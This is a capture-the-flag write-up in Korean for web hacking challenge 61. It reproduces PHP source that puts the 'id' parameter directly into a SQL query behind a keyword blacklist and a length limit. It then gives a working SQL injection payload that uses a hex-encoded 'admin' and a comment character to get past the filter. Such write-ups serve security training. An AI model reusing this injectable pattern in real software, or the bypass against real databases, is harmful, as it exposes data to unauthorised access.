# 61

## Problem
```php
<?

echo("<a href=index_lolll.phps>source</a>");

if(!$_GET[id]) $_GET[id]="guest";

echo("<html><head><title>Challenge 61</title></head><body>");

if(eregi("\(|\)|union|select|challenge|from|,|by|\.",$_GET[id])) exit("Access Denied");
if(strlen($_GET[id])>18) exit("Access Denied");

$q=@mysql_fetch_array(mysql_query("select $_GET[id] from c_61 order by id desc limit 1"));

echo("<b>$q[id]</b><br>");

if($q[id]=="admin") @clear();

echo("</body></html>");

?>
```

## Inspection
* `if(!$_GET[id]) $_GET[id]="guest";`
    - 파라미터 `id`가 넘어오지 않았을 때 `guest` 값으로 대체한다.
* `if(eregi("\(|\)|union|select|challenge|from|,|by|\.",$_GET[id])) exit("Access Denied");`
    - 파라미터 `id`에서 `(`, `)`, `union`, `select`, `challenge`, `from`, `,`, `by`, `.`를 거른다.
* `if(strlen($_GET[id])>18) exit("Access Denied");`
    - 파라미터 `id`의 길이가 18 글자 이상이면 거른다.
* `$q=@mysql_fetch_array(mysql_query("select $_GET[id] from c_61 order by id desc limit 1"));`
    - 다음과 같은 쿼리를 요청한다.
    - `id` 기준 내림차순, 1개 row만.
* `echo("<b>$q[id]</b><br>");`
    - `q[id]`가 있으면 출력한다.
* `if($q[id]=="admin") @clear();`
    - `q[id]`가 `admin`이면 통과한다.

## Solution
* `?id=0x61646d696e%20as%20id#`
    - `select 'admin' as id -- `
    - 작은따옴표로 감싼 문자열이 처리가 안되는 것 같기에 이를 hex 값으로 나타냈다. `'admin'` = `0x61646d696e`
    - 길이를 최대한 줄이기 위해 `--`를 `#`으로 대체했다.